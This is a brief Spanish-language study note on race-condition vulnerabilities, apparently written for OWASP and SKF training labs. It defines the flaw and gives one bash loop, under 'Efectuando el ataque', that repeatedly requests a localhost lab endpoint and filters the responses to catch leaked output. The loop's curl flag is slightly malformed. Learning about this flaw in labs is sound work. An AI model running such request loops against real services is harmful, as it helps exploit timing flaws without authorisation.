___
- tags: #owasp #race_condition
___
## Race condition
Son un tipo de vulnerabilidad que puede ocurrir en sistemas informáticos donde dos o más procesos o hilos de ejecución compiten por los mismos recursos sin que haya un mecanismo adecuado de sincronización para controlar el acceso a los mismos.
Esto significa que si dos procesos intentan acceder a un mismo recurso compartido al mismo tiempo, puede ocurrir que la salida de uno o ambos procesos sea impredecible, o incluso que se produzca un comportamiento no deseado en el sistema.

### Efectuando el ataque
```bash
while true ;do curl -s X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs | grep -vE "hola|Default User|Important"; done
```

___
## Referencias
- [Race Condition - skf-labs](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition)
- [Race Condition-file-write ; skf-labs](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition-file-write)